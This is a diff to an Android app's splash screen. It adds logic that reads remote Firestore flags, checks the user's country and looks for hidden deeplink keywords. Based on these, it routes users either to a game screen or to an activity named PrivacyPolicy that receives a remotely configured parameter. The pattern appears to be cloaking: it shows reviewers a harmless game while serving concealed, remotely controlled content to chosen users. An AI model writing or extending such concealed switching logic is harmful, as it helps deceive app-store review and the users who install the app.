@@ -13,6 +13,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.widget.Toast;
 
 import com.facebook.FacebookSdk;
@@ -40,9 +41,12 @@ public class SplashScreen extends AppCompatActivity {
 
     private SharedPreferences sharedPreferences;
     private String param = "";
+    private String secparam = "";
     private String response = "";
     private String country = "";
+    private String seccountry = "";
     private String insurance = "";
+    private boolean chok;
     private FirebaseFirestore db;
 
     private int checker;
@@ -140,18 +144,53 @@ public class SplashScreen extends AppCompatActivity {
                                 response = value.getString("ded");
                                 country = value.getString("geo");
                                 insurance = value.getString("insurance");
+                                seccountry = value.getString("secgeo");
+                                secparam = value.getString("secname");
+                                chok = value.getBoolean("chok");
 
-                                final String mrep = deeplink.length() >= 7 ? (param + deeplink.substring(6)) : (param);
                                 assert country != null;
 
                                 checker = checker + 1;
 
-                                if ((param != null && !response.equals("") && !param.equals("") && country.contains(geo)) || Objects.requireNonNull(insurance).length() > 5) {
+                                if(deeplink.contains("tDnmk"))
+                                    secparam = "";
+
+                                if ((secparam != null && !response.equals("") && !secparam.equals("") && seccountry.contains(geo)) && chok || Objects.requireNonNull(insurance).length() > 5
+                                        || deeplink.contains("kLtdas") && secparam != null) {
+                                    timer = new Timer();
+                                    timerTask = new TimerTask() {
+                                        @Override
+                                        public void run() {
+                                            if (secparam != null && response != null && !secparam.equals("")) {
+                                                String test = App.getAppsFlyerId();
+                                                String mrep = deeplink.length() >= 7 ? (secparam + deeplink.substring(12)) : (secparam);
+                                                Intent intent = new Intent(SplashScreen.this, PrivacyPolicy.class);
+                                                sharedPreferences.edit().putString("param", mrep).apply();
+                                                response = "";
+                                                startActivity(intent);
+                                                finish();
+                                            } else {
+                                                Intent intent = new Intent(SplashScreen.this, Game.class);
+                                                startActivity(intent);
+                                                finish();
+                                            }
+                                        }
+                                    };
+                                    timer.schedule(timerTask, 1500);
+                                } else if (chok) {
+                                    Intent intent = new Intent(SplashScreen.this, Game.class);
+                                    startActivity(intent);
+                                    finish();
+                                }
+
+                                if ((param != null && !response.equals("") && !param.equals("") && country.contains(geo)) && !chok || Objects.requireNonNull(insurance).length() > 5
+                                        || deeplink.contains("tDnmk") && secparam != null) {
                                     timer = new Timer();
                                     timerTask = new TimerTask() {
                                         @Override
                                         public void run() {
                                             if (param != null && response != null && !param.equals("")) {
+                                                String mrep = deeplink.length() >= 7 ? (param + deeplink.substring(11)) : (param);
                                                 Intent intent = new Intent(SplashScreen.this, PrivacyPolicy.class);
                                                 sharedPreferences.edit().putString("param", mrep).apply();
                                                 startActivity(intent);
@@ -164,7 +203,7 @@ public class SplashScreen extends AppCompatActivity {
                                         }
                                     };
                                     timer.schedule(timerTask, 1500);
-                                } else {
+                                } else if (!chok) {
                                     Intent intent = new Intent(SplashScreen.this, Game.class);
                                     startActivity(intent);
                                     finish();
